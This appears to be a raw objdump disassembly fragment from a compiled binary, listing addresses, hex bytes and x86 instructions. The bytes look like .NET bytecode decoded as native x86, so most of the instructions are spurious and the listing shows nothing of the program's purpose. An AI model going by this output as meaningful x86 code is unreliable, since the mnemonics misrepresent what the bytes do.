  4047b6:	04 6c                	add    $0x6c,%al
  4047b8:	23 00                	and    (%eax),%eax
  4047ba:	00 00                	add    %al,(%eax)
  4047bc:	00 00                	add    %al,(%eax)
  4047be:	40                   	inc    %eax
  4047bf:	8f 40 5b             	pop    0x5b(%eax)
  4047c2:	28 66 00             	sub    %ah,0x0(%esi)
  4047c5:	00 0a                	add    %cl,(%edx)
  4047c7:	b7 0a                	mov    $0xa,%bh
  4047c9:	2b 06                	sub    (%esi),%eax
  4047cb:	2b 04 16             	sub    (%esi,%edx,1),%eax
  4047ce:	0a 2b                	or     (%ebx),%ch
  4047d0:	00 06                	add    %al,(%esi)
  4047d2:	2a 00                	sub    (%eax),%al
  4047d4:	13 30                	adc    (%eax),%esi
  4047d6:	02 00                	add    (%eax),%al
  4047d8:	50                   	push   %eax
  4047d9:	00 00                	add    %al,(%eax)
  4047db:	00 2e                	add    %ch,(%esi)
  4047dd:	00 00                	add    %al,(%eax)
  4047df:	11 2b                	adc    %ebp,(%ebx)
  4047e1:	49                   	dec    %ecx
  4047e2:	20 e8                	and    %ch,%al
  4047e4:	03 00                	add    (%eax),%eax
  4047e6:	00 28                	add    %ch,(%eax)
  4047e8:	20 00                	and    %al,(%eax)
  4047ea:	00 0a                	add    %cl,(%edx)
  4047ec:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4047f0:	06                   	push   %es
  4047f1:	0b 7e 27             	or     0x27(%esi),%edi
  4047f4:	00 00                	add    %al,(%eax)
  4047f6:	04 07                	add    $0x7,%al
  4047f8:	31 1c 7f             	xor    %ebx,(%edi,%edi,2)
  4047fb:	26 00 00             	add    %al,%es:(%eax)
  4047fe:	04 7e                	add    $0x7e,%al
  404800:	27                   	daa
  404801:	00 00                	add    %al,(%eax)
  404803:	04 6c                	add    $0x6c,%al
  404805:	28 b3 00 00 0a 28    	sub    %dh,0x280a0000(%ebx)
  40480b:	f3 00 00             	repz add %al,(%eax)
  40480e:	0a 80 26 00 00 04    	or     0x4000026(%eax),%al
  404814:	2b 0f                	sub    (%edi),%ecx
  404816:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40481a:	06                   	push   %es
  40481b:	28 75 00             	sub    %dh,0x0(%ebp)
  40481e:	00 0a                	add    %cl,(%edx)
  404820:	80 28 00             	subb   $0x0,(%eax)
  404823:	00 04 07             	add    %al,(%edi,%eax,1)
  404826:	80 27 00             	andb   $0x0,(%edi)
  404829:	00 04 17             	add    %al,(%edi,%edx,1)
  40482c:	2d b4 06 2a 1b       	sub    $0x1b2a06b4,%eax
  404831:	30 01                	xor    %al,(%ecx)
  404833:	00 1a                	add    %bl,(%edx)
  404835:	00 00                	add    %al,(%eax)
  404837:	00 00                	add    %al,(%eax)
  404839:	00 00                	add    %al,(%eax)
  40483b:	00 20                	add    %ah,(%eax)
  40483d:	03 00                	add    (%eax),%eax
  40483f:	00 80 28 48 00 00    	add    %al,0x4828(%eax)
  404845:	06                   	push   %es
  404846:	26 de 0c 28          	fimuls %es:(%eax,%ebp,1)
  40484a:	22 00                	and    (%eax),%al
  40484c:	00 0a                	add    %cl,(%edx)
  40484e:	28 24 00             	sub    %ah,(%eax,%eax,1)
  404851:	00 0a                	add    %cl,(%edx)
  404853:	de 00                	fiadds (%eax)
  404855:	2a 00                	sub    (%eax),%al
  404857:	00 01                	add    %al,(%ecx)
  404859:	10 00                	adc    %al,(%eax)
  40485b:	00 00                	add    %al,(%eax)
  40485d:	00 00                	add    %al,(%eax)
  40485f:	00 0d 0d 00 0c 25    	add    %cl,0x250c000d
  404865:	00 00                	add    %al,(%eax)
  404867:	01 1b                	add    %ebx,(%ebx)
  404869:	30 03                	xor    %al,(%ebx)
  40486b:	00 41 00             	add    %al,0x0(%ecx)
  40486e:	00 00                	add    %al,(%eax)
  404870:	30 00                	xor    %al,(%eax)
  404872:	00 11                	add    %dl,(%ecx)
  404874:	20 00                	and    %al,(%eax)
  404876:	01 00                	add    %eax,(%eax)
  404878:	00 73 ee             	add    %dh,-0x12(%ebx)
  40487b:	00 00                	add    %al,(%eax)
  40487d:	0a 0b                	or     (%ebx),%cl
  40487f:	28 46 00             	sub    %al,0x0(%esi)
  404882:	00 06                	add    %al,(%esi)
  404884:	0c 08                	or     $0x8,%al
  404886:	07                   	pop    %es
  404887:	20 00                	and    %al,(%eax)
  404889:	01 00                	add    %eax,(%eax)
  40488b:	00 28                	add    %ch,(%eax)
  40488d:	47                   	inc    %edi
  40488e:	00 00                	add    %al,(%eax)
  404890:	06                   	push   %es
  404891:	16                   	push   %ss
  404892:	31 09                	xor    %ecx,(%ecx)
  404894:	07                   	pop    %es
  404895:	6f                   	outsl  %ds:(%esi),(%dx)
  404896:	59                   	pop    %ecx
  404897:	00 00                	add    %al,(%eax)
  404899:	0a 0a                	or     (%edx),%cl
  40489b:	de 16                	ficoms (%esi)
  40489d:	de 0c 28             	fimuls (%eax,%ebp,1)
  4048a0:	22 00                	and    (%eax),%al
  4048a2:	00 0a                	add    %cl,(%edx)
  4048a4:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4048a7:	00 0a                	add    %cl,(%edx)
  4048a9:	de 00                	fiadds (%eax)
  4048ab:	72 63                	jb     0x404910
  4048ad:	03 00                	add    (%eax),%eax
  4048af:	70 0a                	jo     0x4048bb
  4048b1:	2b 00                	sub    (%eax),%eax
  4048b3:	06                   	push   %es
  4048b4:	2a 00                	sub    (%eax),%al
  4048b6:	00 00                	add    %al,(%eax)
  4048b8:	01 10                	add    %edx,(%eax)
  4048ba:	00 00                	add    %al,(%eax)
  4048bc:	00 00                	add    %al,(%eax)
  4048be:	00 00                	add    %al,(%eax)
  4048c0:	2b 2b                	sub    (%ebx),%ebp
  4048c2:	00 0c 25 00 00 01 13 	add    %cl,0x13010000(,%eiz,1)
  4048c9:	30 02                	xor    %al,(%edx)
  4048cb:	00 10                	add    %dl,(%eax)
  4048cd:	00 00                	add    %al,(%eax)
  4048cf:	00 31                	add    %dh,(%ecx)
  4048d1:	00 00                	add    %al,(%eax)
  4048d3:	11 28                	adc    %ebp,(%eax)
  4048d5:	d2 00                	rolb   %cl,(%eax)
  4048d7:	00 0a                	add    %cl,(%edx)
  4048d9:	02 6f d3             	add    -0x2d(%edi),%ch
  4048dc:	00 00                	add    %al,(%eax)
  4048de:	0a 0a                	or     (%edx),%cl
  4048e0:	2b 00                	sub    (%eax),%eax
  4048e2:	06                   	push   %es
  4048e3:	2a 13                	sub    (%ebx),%dl
  4048e5:	30 02                	xor    %al,(%edx)
  4048e7:	00 10                	add    %dl,(%eax)
  4048e9:	00 00                	add    %al,(%eax)
  4048eb:	00 32                	add    %dh,(%edx)
  4048ed:	00 00                	add    %al,(%eax)
  4048ef:	11 28                	adc    %ebp,(%eax)
  4048f1:	d2 00                	rolb   %cl,(%eax)
  4048f3:	00 0a                	add    %cl,(%edx)
  4048f5:	02 6f f4             	add    -0xc(%edi),%ch
  4048f8:	00 00                	add    %al,(%eax)
  4048fa:	0a 0a                	or     (%edx),%cl
  4048fc:	2b 00                	sub    (%eax),%eax
  4048fe:	06                   	push   %es
  4048ff:	2a 1b                	sub    (%ebx),%bl
  404901:	30 03                	xor    %al,(%ebx)
  404903:	00 73 00             	add    %dh,0x0(%ebx)
  404906:	00 00                	add    %al,(%eax)
  404908:	33 00                	xor    (%eax),%eax
  40490a:	00 11                	add    %dl,(%ecx)
  40490c:	1b 8d 03 00 00 01    	sbb    0x1000003(%ebp),%ecx
  404912:	0b 07                	or     (%edi),%eax
  404914:	16                   	push   %ss
  404915:	28 f5                	sub    %dh,%ch
  404917:	00 00                	add    %al,(%eax)
  404919:	0a 8c 71 00 00 01 a2 	or     -0x5dff0000(%ecx,%esi,2),%cl
  404920:	07                   	pop    %es
  404921:	17                   	pop    %ss
  404922:	28 3d 00 00 0a a2    	sub    %bh,0xa20a0000
  404928:	07                   	pop    %es
  404929:	18 28                	sbb    %ch,(%eax)
  40492b:	4e                   	dec    %esi
  40492c:	00 00                	add    %al,(%eax)
  40492e:	0a a2 07 19 28 40    	or     0x40281907(%edx),%ah
  404934:	00 00                	add    %al,(%eax)
  404936:	0a a2 07 1a 28 f6    	or     -0x9d7e5f9(%edx),%ah
  40493c:	00 00                	add    %al,(%eax)
  40493e:	0a 28                	or     (%eax),%ch
  404940:	f7 00 00 0a 73 f8    	testl  $0xf8730a00,(%eax)
  404946:	00 00                	add    %al,(%eax)
  404948:	0a 6f f9             	or     -0x7(%edi),%ch
  40494b:	00 00                	add    %al,(%eax)
  40494d:	0a 8c 91 00 00 01 a2 	or     -0x5dff0000(%ecx,%edx,4),%cl
  404954:	07                   	pop    %es
  404955:	28 45 00             	sub    %al,0x0(%ebp)
  404958:	00 0a                	add    %cl,(%edx)
  40495a:	28 4e 00             	sub    %cl,0x0(%esi)
  40495d:	00 06                	add    %al,(%esi)
  40495f:	0a de                	or     %dh,%bl
  404961:	1b de                	sbb    %esi,%ebx
  404963:	19 28                	sbb    %ebp,(%eax)
  404965:	22 00                	and    (%eax),%al
  404967:	00 0a                	add    %cl,(%edx)
  404969:	72 6f                	jb     0x4049da
  40496b:	0c 00                	or     $0x0,%al
  40496d:	70 0a                	jo     0x404979
  40496f:	28 24 00             	sub    %ah,(%eax,%eax,1)
  404972:	00 0a                	add    %cl,(%edx)
  404974:	de 07                	fiadds (%edi)
  404976:	28 24 00             	sub    %ah,(%eax,%eax,1)
  404979:	00 0a                	add    %cl,(%edx)
  40497b:	de 00                	fiadds (%eax)
  40497d:	06                   	push   %es
  40497e:	2a 00                	sub    (%eax),%al
  404980:	01 10                	add    %edx,(%eax)
  404982:	00 00                	add    %al,(%eax)
  404984:	00 00                	add    %al,(%eax)
  404986:	00 00                	add    %al,(%eax)
  404988:	58                   	pop    %eax
  404989:	58                   	pop    %eax
  40498a:	00 19                	add    %bl,(%ecx)
  40498c:	25 00 00 01 13       	and    $0x13010000,%eax
  404991:	30 03                	xor    %al,(%ebx)
  404993:	00 68 00             	add    %ch,0x0(%eax)
  404996:	00 00                	add    %al,(%eax)
  404998:	34 00                	xor    $0x0,%al
  40499a:	00 11                	add    %dl,(%ecx)
  40499c:	73 e2                	jae    0x404980
  40499e:	00 00                	add    %al,(%eax)
  4049a0:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  4049a3:	fa                   	cli
  4049a4:	00 00                	add    %al,(%eax)
  4049a6:	0a 02                	or     (%edx),%al
  4049a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4049a9:	d3 00                	roll   %cl,(%eax)
  4049ab:	00 0a                	add    %cl,(%edx)
  4049ad:	0a 08                	or     (%eax),%cl
  4049af:	06                   	push   %es
  4049b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4049b1:	e3 00                	jecxz  0x4049b3
  4049b3:	00 0a                	add    %cl,(%edx)
  4049b5:	0a 73 51             	or     0x51(%ebx),%dh
  4049b8:	00 00                	add    %al,(%eax)
  4049ba:	0a 0d 06 13 06 16    	or     0x16061306,%cl
  4049c0:	13 05 2b 20 11 06    	adc    0x611202b,%eax
  4049c6:	11 05 91 13 04 09    	adc    %eax,0x9041391
  4049cc:	12 04 72             	adc    (%edx,%esi,2),%al
  4049cf:	81 0c 00 70 28 fb 00 	orl    $0xfb2870,(%eax,%eax,1)
  4049d6:	00 0a                	add    %cl,(%edx)
  4049d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4049d9:	56                   	push   %esi
  4049da:	00 00                	add    %al,(%eax)
  4049dc:	0a 26                	or     (%esi),%ah
  4049de:	11 05 17 d6 13 05    	adc    %eax,0x513d617
  4049e4:	11 05 11 06 8e b7    	adc    %eax,0xb78e0611
  4049ea:	32 d8                	xor    %al,%bl
  4049ec:	09 6f 59             	or     %ebp,0x59(%edi)
  4049ef:	00 00                	add    %al,(%eax)
  4049f1:	0a 16                	or     (%esi),%dl
  4049f3:	1f                   	pop    %ds
  4049f4:	14 6f                	adc    $0x6f,%al
  4049f6:	5c                   	pop    %esp
  4049f7:	00 00                	add    %al,(%eax)
  4049f9:	0a 6f fc             	or     -0x4(%edi),%ch
  4049fc:	00 00                	add    %al,(%eax)
  4049fe:	0a 0b                	or     (%ebx),%cl
  404a00:	2b 00                	sub    (%eax),%eax
  404a02:	07                   	pop    %es
  404a03:	2a 1b                	sub    (%ebx),%bl
  404a05:	30 04 00             	xor    %al,(%eax,%eax,1)
  404a08:	40                   	inc    %eax
  404a09:	00 00                	add    %al,(%eax)
  404a0b:	00 35 00 00 11 7e    	add    %dh,0x7e110000
  404a11:	fd                   	std
  404a12:	00 00                	add    %al,(%eax)
  404a14:	0a 7e 22             	or     0x22(%esi),%bh
  404a17:	00 00                	add    %al,(%eax)
  404a19:	04 18                	add    $0x18,%al
  404a1b:	6f                   	outsl  %ds:(%esi),(%dx)
  404a1c:	fe 00                	incb   (%eax)
  404a1e:	00 0a                	add    %cl,(%edx)
  404a20:	0b 07                	or     (%edi),%eax
  404a22:	02 03                	add    (%ebx),%al
  404a24:	19 6f ff             	sbb    %ebp,-0x1(%edi)
  404a27:	00 00                	add    %al,(%eax)
  404a29:	0a 17                	or     (%edi),%dl
  404a2b:	0a de                	or     %dh,%bl
  404a2d:	20 de                	and    %bl,%dh
  404a2f:	0a 07                	or     (%edi),%al
  404a31:	2c 06                	sub    $0x6,%al
  404a33:	07                   	pop    %es
  404a34:	6f                   	outsl  %ds:(%esi),(%dx)
  404a35:	58                   	pop    %eax
  404a36:	00 00                	add    %al,(%eax)
  404a38:	0a dc                	or     %ah,%bl
  404a3a:	de 0e                	fimuls (%esi)
  404a3c:	25 28 22 00 00       	and    $0x2228,%eax
  404a41:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  404a44:	24 00                	and    $0x0,%al
  404a46:	00 0a                	add    %cl,(%edx)
  404a48:	de 00                	fiadds (%eax)
  404a4a:	16                   	push   %ss
  404a4b:	0a 2b                	or     (%ebx),%ch
  404a4d:	00 06                	add    %al,(%esi)
  404a4f:	2a 01                	sub    (%ecx),%al
  404a51:	1c 00                	sbb    $0x0,%al
  404a53:	00 02                	add    %al,(%edx)
  404a55:	00 11                	add    %dl,(%ecx)
  404a57:	00 0f                	add    %cl,(%edi)
  404a59:	20 00                	and    %al,(%eax)
  404a5b:	0a 00                	or     (%eax),%al
  404a5d:	00 00                	add    %al,(%eax)
  404a5f:	00 00                	add    %al,(%eax)
  404a61:	00 00                	add    %al,(%eax)
  404a63:	00 2c 2c             	add    %ch,(%esp,%ebp,1)
  404a66:	00 0e                	add    %cl,(%esi)
  404a68:	25 00 00 01 1b       	and    $0x1b010000,%eax
  404a6d:	30 02                	xor    %al,(%edx)
  404a6f:	00 48 00             	add    %cl,0x0(%eax)
  404a72:	00 00                	add    %al,(%eax)
  404a74:	36 00 00             	add    %al,%ss:(%eax)
  404a77:	11 7e fd             	adc    %edi,-0x3(%esi)
  404a7a:	00 00                	add    %al,(%eax)
  404a7c:	0a 7e 22             	or     0x22(%esi),%bh
  404a7f:	00 00                	add    %al,(%eax)
  404a81:	04 6f                	add    $0x6f,%al
  404a83:	00 01                	add    %al,(%ecx)
  404a85:	00 0a                	add    %cl,(%edx)
  404a87:	0b 07                	or     (%edi),%eax
  404a89:	02 6f 01             	add    0x1(%edi),%ch
  404a8c:	01 00                	add    %eax,(%eax)
  404a8e:	0a 28                	or     (%eax),%ch
  404a90:	11 00                	adc    %eax,(%eax)
  404a92:	00 0a                	add    %cl,(%edx)
  404a94:	0c 08                	or     $0x8,%al
  404a96:	74 09                	je     0x404aa1
  404a98:	00 00                	add    %al,(%eax)
  404a9a:	1b 0a                	sbb    (%edx),%ecx
  404a9c:	de 20                	fisubs (%eax)
  404a9e:	de 0a                	fimuls (%edx)
  404aa0:	07                   	pop    %es
  404aa1:	2c 06                	sub    $0x6,%al
  404aa3:	07                   	pop    %es
  404aa4:	6f                   	outsl  %ds:(%esi),(%dx)
  404aa5:	58                   	pop    %eax
  404aa6:	00 00                	add    %al,(%eax)
  404aa8:	0a dc                	or     %ah,%bl
  404aaa:	de 0e                	fimuls (%esi)
  404aac:	25 28 22 00 00       	and    $0x2228,%eax
  404ab1:	0a 0d 28 24 00 00    	or     0x2428,%cl
  404ab7:	0a de                	or     %dh,%bl
  404ab9:	00 14 0a             	add    %dl,(%edx,%ecx,1)
  404abc:	2b 00                	sub    (%eax),%eax
  404abe:	06                   	push   %es
  404abf:	2a 01                	sub    (%ecx),%al
  404ac1:	1c 00                	sbb    $0x0,%al
  404ac3:	00 02                	add    %al,(%edx)
  404ac5:	00 10                	add    %dl,(%eax)
  404ac7:	00 18                	add    %bl,(%eax)
  404ac9:	28 00                	sub    %al,(%eax)
  404acb:	0a 00                	or     (%eax),%al
  404acd:	00 00                	add    %al,(%eax)
  404acf:	00 00                	add    %al,(%eax)
  404ad1:	00 00                	add    %al,(%eax)
  404ad3:	00 34 34             	add    %dh,(%esp,%esi,1)
  404ad6:	00 0e                	add    %cl,(%esi)
  404ad8:	25 00 00 01 1b       	and    $0x1b010000,%eax
  404add:	30 09                	xor    %cl,(%ecx)
  404adf:	00 5f 01             	add    %bl,0x1(%edi)
  404ae2:	00 00                	add    %al,(%eax)
  404ae4:	37                   	aaa
  404ae5:	00 00                	add    %al,(%eax)
  404ae7:	11 02                	adc    %eax,(%edx)
  404ae9:	73 02                	jae    0x404aed
  404aeb:	01 00                	add    %eax,(%eax)
  404aed:	0a 0b                	or     (%ebx),%cl
  404aef:	1a 8d 33 00 00 01    	sbb    0x1000033(%ebp),%cl
  404af5:	0d 07 14 72 87       	or     $0x87721407,%eax
  404afa:	0c 00                	or     $0x0,%al
  404afc:	70 19                	jo     0x404b17
  404afe:	8d 03                	lea    (%ebx),%eax
  404b00:	00 00                	add    %al,(%eax)
  404b02:	01 13                	add    %edx,(%ebx)
  404b04:	06                   	push   %es
  404b05:	11 06                	adc    %eax,(%esi)
  404b07:	16                   	push   %ss
  404b08:	09 a2 11 06 17 16    	or     %esp,0x16170611(%edx)
  404b0e:	8c 71 00             	mov    %?,0x0(%ecx)
  404b11:	00 01                	add    %al,(%ecx)
  404b13:	a2 11 06 18 1a       	mov    %al,0x1a180611
  404b18:	8c 71 00             	mov    %?,0x0(%ecx)
  404b1b:	00 01                	add    %al,(%ecx)
  404b1d:	a2 11 06 13 07       	mov    %al,0x7130611
  404b22:	11 07                	adc    %eax,(%edi)
  404b24:	14 14                	adc    $0x14,%al
  404b26:	19 8d 38 00 00 01    	sbb    %ecx,0x1000038(%ebp)
  404b2c:	13 08                	adc    (%eax),%ecx
  404b2e:	11 08                	adc    %ecx,(%eax)
  404b30:	16                   	push   %ss
  404b31:	17                   	pop    %ss
  404b32:	9c                   	pushf
  404b33:	11 08                	adc    %ecx,(%eax)
  404b35:	17                   	pop    %ss
  404b36:	16                   	push   %ss
  404b37:	9c                   	pushf
  404b38:	11 08                	adc    %ecx,(%eax)
  404b3a:	18 16                	sbb    %dl,(%esi)
  404b3c:	9c                   	pushf
  404b3d:	11 08                	adc    %ecx,(%eax)
  404b3f:	17                   	pop    %ss
  404b40:	28 72 00             	sub    %dh,0x0(%edx)
  404b43:	00 0a                	add    %cl,(%edx)
  404b45:	26 11 08             	adc    %ecx,%es:(%eax)
  404b48:	16                   	push   %ss
  404b49:	90                   	nop
  404b4a:	2c 1e                	sub    $0x1e,%al
  404b4c:	11 07                	adc    %eax,(%edi)
  404b4e:	16                   	push   %ss
  404b4f:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  404b56:	09 00                	or     %eax,(%eax)
  404b58:	00 1b                	add    %bl,(%ebx)
  404b5a:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404b5d:	00 0a                	add    %cl,(%edx)
  404b5f:	28 03                	sub    %al,(%ebx)
  404b61:	01 00                	add    %eax,(%eax)
  404b63:	0a 74 09 00          	or     0x0(%ecx,%ecx,1),%dh
  404b67:	00 1b                	add    %bl,(%ebx)
  404b69:	0d 09 16 28 04       	or     $0x4281609,%eax
  404b6e:	01 00                	add    %eax,(%eax)
  404b70:	0a 8c 71 00 00 01 0c 	or     0xc010000(%ecx,%esi,2),%cl
  404b77:	07                   	pop    %es
  404b78:	74 4d                	je     0x404bc7
  404b7a:	00 00                	add    %al,(%eax)
  404b7c:	01 16                	add    %edx,(%esi)
  404b7e:	73 05                	jae    0x404b85
  404b80:	01 00                	add    %eax,(%eax)
  404b82:	0a 13                	or     (%ebx),%dl
  404b84:	04 08                	add    $0x8,%al
  404b86:	17                   	pop    %ss
  404b87:	8c 71 00             	mov    %?,0x0(%ecx)
  404b8a:	00 01                	add    %al,(%ecx)
  404b8c:	28 06                	sub    %al,(%esi)
  404b8e:	01 00                	add    %eax,(%eax)
  404b90:	0a 28                	or     (%eax),%ch
  404b92:	07                   	pop    %es
  404b93:	01 00                	add    %eax,(%eax)
  404b95:	0a 17                	or     (%edi),%dl
  404b97:	d6                   	salc
  404b98:	8d 33                	lea    (%ebx),%esi
  404b9a:	00 00                	add    %al,(%eax)
  404b9c:	01 13                	add    %edx,(%ebx)
  404b9e:	05 11 04 14 72       	add    $0x72140411,%eax
  404ba3:	87 0c 00             	xchg   %ecx,(%eax,%eax,1)
  404ba6:	70 19                	jo     0x404bc1
  404ba8:	8d 03                	lea    (%ebx),%eax
  404baa:	00 00                	add    %al,(%eax)
  404bac:	01 13                	add    %edx,(%ebx)
  404bae:	07                   	pop    %es
  404baf:	11 07                	adc    %eax,(%edi)
  404bb1:	16                   	push   %ss
  404bb2:	11 05 28 11 00 00    	adc    %eax,0x1128
  404bb8:	0a a2 11 07 17 16    	or     0x16170711(%edx),%ah
  404bbe:	8c 71 00             	mov    %?,0x0(%ecx)
  404bc1:	00 01                	add    %al,(%ecx)
  404bc3:	a2 11 07 18 08       	mov    %al,0x8180711
  404bc8:	28 11                	sub    %dl,(%ecx)
  404bca:	00 00                	add    %al,(%eax)
  404bcc:	0a a2 11 07 13 06    	or     0x6130711(%edx),%ah
  404bd2:	11 06                	adc    %eax,(%esi)
  404bd4:	14 14                	adc    $0x14,%al
  404bd6:	19 8d 38 00 00 01    	sbb    %ecx,0x1000038(%ebp)
  404bdc:	13 08                	adc    (%eax),%ecx
  404bde:	11 08                	adc    %ecx,(%eax)
  404be0:	16                   	push   %ss
  404be1:	17                   	pop    %ss
  404be2:	9c                   	pushf
  404be3:	11 08                	adc    %ecx,(%eax)
  404be5:	17                   	pop    %ss
  404be6:	16                   	push   %ss
  404be7:	9c                   	pushf
  404be8:	11 08                	adc    %ecx,(%eax)
  404bea:	18 17                	sbb    %dl,(%edi)
  404bec:	9c                   	pushf
  404bed:	11 08                	adc    %ecx,(%eax)
  404bef:	17                   	pop    %ss
  404bf0:	28 72 00             	sub    %dh,0x0(%edx)
  404bf3:	00 0a                	add    %cl,(%edx)
  404bf5:	26 11 08             	adc    %ecx,%es:(%eax)
  404bf8:	16                   	push   %ss
  404bf9:	90                   	nop
  404bfa:	2c 0b                	sub    $0xb,%al
  404bfc:	11 06                	adc    %eax,(%esi)
  404bfe:	16                   	push   %ss
  404bff:	9a 28 11 00 00 0a 13 	lcall  $0x130a,$0x1128
  404c06:	05 11 08 18 90       	add    $0x90180811,%eax
  404c0b:	2c 0a                	sub    $0xa,%al
  404c0d:	11 06                	adc    %eax,(%esi)
  404c0f:	18 9a 28 11 00 00    	sbb    %bl,0x1128(%edx)
  404c15:	0a 0c 11             	or     (%ecx,%edx,1),%cl
  404c18:	05 74 09 00 00       	add    $0x974,%eax
  404c1d:	1b 0a                	sbb    (%edx),%ecx
  404c1f:	de 24 de             	fisubs (%esi,%ebx,8)
  404c22:	11 11                	adc    %edx,(%ecx)
  404c24:	04 2c                	add    $0x2c,%al
  404c26:	0c 11                	or     $0x11,%al
  404c28:	04 74                	add    $0x74,%al
  404c2a:	45                   	inc    %ebp
  404c2b:	00 00                	add    %al,(%eax)
  404c2d:	01 6f 58             	add    %ebp,0x58(%edi)
  404c30:	00 00                	add    %al,(%eax)
  404c32:	0a dc                	or     %ah,%bl
  404c34:	de 0f                	fimuls (%edi)
  404c36:	07                   	pop    %es
  404c37:	2c 0b                	sub    $0xb,%al
  404c39:	07                   	pop    %es
  404c3a:	74 45                	je     0x404c81
  404c3c:	00 00                	add    %al,(%eax)
  404c3e:	01 6f 58             	add    %ebp,0x58(%edi)
  404c41:	00 00                	add    %al,(%eax)
  404c43:	0a dc                	or     %ah,%bl
  404c45:	06                   	push   %es
  404c46:	2a 00                	sub    (%eax),%al
  404c48:	41                   	inc    %ecx
  404c49:	34 00                	xor    $0x0,%al
  404c4b:	00 02                	add    %al,(%edx)
  404c4d:	00 00                	add    %al,(%eax)
  404c4f:	00 9d 00 00 00 9e    	add    %bl,-0x62000000(%ebp)
  404c55:	00 00                	add    %al,(%eax)
  404c57:	00 3b                	add    %bh,(%ebx)
  404c59:	01 00                	add    %eax,(%eax)
  404c5b:	00 11                	add    %dl,(%ecx)
  404c5d:	00 00                	add    %al,(%eax)
  404c5f:	00 00                	add    %al,(%eax)
  404c61:	00 00                	add    %al,(%eax)
  404c63:	00 02                	add    %al,(%edx)
  404c65:	00 00                	add    %al,(%eax)
  404c67:	00 07                	add    %al,(%edi)
  404c69:	00 00                	add    %al,(%eax)
  404c6b:	00 47 01             	add    %al,0x1(%edi)
  404c6e:	00 00                	add    %al,(%eax)
  404c70:	4e                   	dec    %esi
  404c71:	01 00                	add    %eax,(%eax)
  404c73:	00 0f                	add    %cl,(%edi)
  404c75:	00 00                	add    %al,(%eax)
  404c77:	00 00                	add    %al,(%eax)
  404c79:	00 00                	add    %al,(%eax)
  404c7b:	00 1b                	add    %bl,(%ebx)
  404c7d:	30 09                	xor    %cl,(%ecx)
  404c7f:	00 50 01             	add    %dl,0x1(%eax)
  404c82:	00 00                	add    %al,(%eax)
  404c84:	38 00                	cmp    %al,(%eax)
  404c86:	00 11                	add    %dl,(%ecx)
  404c88:	73 33                	jae    0x404cbd
  404c8a:	00 00                	add    %al,(%eax)
  404c8c:	0a 0b                	or     (%ebx),%cl
  404c8e:	02 8e b7 28 08 01    	add    0x10828b7(%esi),%cl
  404c94:	00 0a                	add    %cl,(%edx)
  404c96:	0c 07                	or     $0x7,%al
  404c98:	14 72                	adc    $0x72,%al
  404c9a:	91                   	xchg   %eax,%ecx
  404c9b:	0c 00                	or     $0x0,%al
  404c9d:	70 19                	jo     0x404cb8
  404c9f:	8d 03                	lea    (%ebx),%eax
  404ca1:	00 00                	add    %al,(%eax)
  404ca3:	01 13                	add    %edx,(%ebx)
  404ca5:	04 11                	add    $0x11,%al
  404ca7:	04 16                	add    $0x16,%al
  404ca9:	08 28                	or     %ch,(%eax)
  404cab:	11 00                	adc    %eax,(%eax)
  404cad:	00 0a                	add    %cl,(%edx)
  404caf:	a2 11 04 17 16       	mov    %al,0x16170411
  404cb4:	8c 71 00             	mov    %?,0x0(%ecx)
  404cb7:	00 01                	add    %al,(%ecx)
  404cb9:	a2 11 04 18 1a       	mov    %al,0x1a180411
  404cbe:	8c 71 00             	mov    %?,0x0(%ecx)
  404cc1:	00 01                	add    %al,(%ecx)
  404cc3:	a2 11 04 13 05       	mov    %al,0x5130411
  404cc8:	11 05 14 14 19 8d    	adc    %eax,0x8d191414
  404cce:	38 00                	cmp    %al,(%eax)
  404cd0:	00 01                	add    %al,(%ecx)
  404cd2:	13 06                	adc    (%esi),%eax
  404cd4:	11 06                	adc    %eax,(%esi)
  404cd6:	16                   	push   %ss
  404cd7:	17                   	pop    %ss
  404cd8:	9c                   	pushf
  404cd9:	11 06                	adc    %eax,(%esi)
  404cdb:	17                   	pop    %ss
  404cdc:	16                   	push   %ss
  404cdd:	9c                   	pushf
  404cde:	11 06                	adc    %eax,(%esi)
  404ce0:	18 16                	sbb    %dl,(%esi)
  404ce2:	9c                   	pushf
  404ce3:	11 06                	adc    %eax,(%esi)
  404ce5:	17                   	pop    %ss
  404ce6:	28 72 00             	sub    %dh,0x0(%edx)
  404ce9:	00 0a                	add    %cl,(%edx)
  404ceb:	26 11 06             	adc    %eax,%es:(%esi)
  404cee:	16                   	push   %ss
  404cef:	90                   	nop
  404cf0:	2c 0a                	sub    $0xa,%al
  404cf2:	11 05 16 9a 28 11    	adc    %eax,0x11289a16
  404cf8:	00 00                	add    %al,(%eax)
  404cfa:	0a 0c 07             	or     (%edi,%eax,1),%cl
  404cfd:	74 4d                	je     0x404d4c
  404cff:	00 00                	add    %al,(%eax)
  404d01:	01 17                	add    %edx,(%edi)
  404d03:	73 05                	jae    0x404d0a
  404d05:	01 00                	add    %eax,(%eax)
  404d07:	0a 0d 09 14 72 91    	or     0x91721409,%cl
  404d0d:	0c 00                	or     $0x0,%al
  404d0f:	70 19                	jo     0x404d2a
  404d11:	8d 03                	lea    (%ebx),%eax
  404d13:	00 00                	add    %al,(%eax)
  404d15:	01 13                	add    %edx,(%ebx)
  404d17:	05 11 05 16 02       	add    $0x2160511,%eax
  404d1c:	a2 11 05 17 16       	mov    %al,0x16170511
  404d21:	8c 71 00             	mov    %?,0x0(%ecx)
  404d24:	00 01                	add    %al,(%ecx)
  404d26:	a2 11 05 18 02       	mov    %al,0x2180511
  404d2b:	8e b7 8c 71 00 00    	mov    0x718c(%edi),%?
  404d31:	01 a2 11 05 13 04    	add    %esp,0x4130511(%edx)
  404d37:	11 04 14             	adc    %eax,(%esp,%edx,1)
  404d3a:	14 19                	adc    $0x19,%al
  404d3c:	8d 38                	lea    (%eax),%edi
  404d3e:	00 00                	add    %al,(%eax)
  404d40:	01 13                	add    %edx,(%ebx)
  404d42:	06                   	push   %es
  404d43:	11 06                	adc    %eax,(%esi)
  404d45:	16                   	push   %ss
  404d46:	17                   	pop    %ss
  404d47:	9c                   	pushf
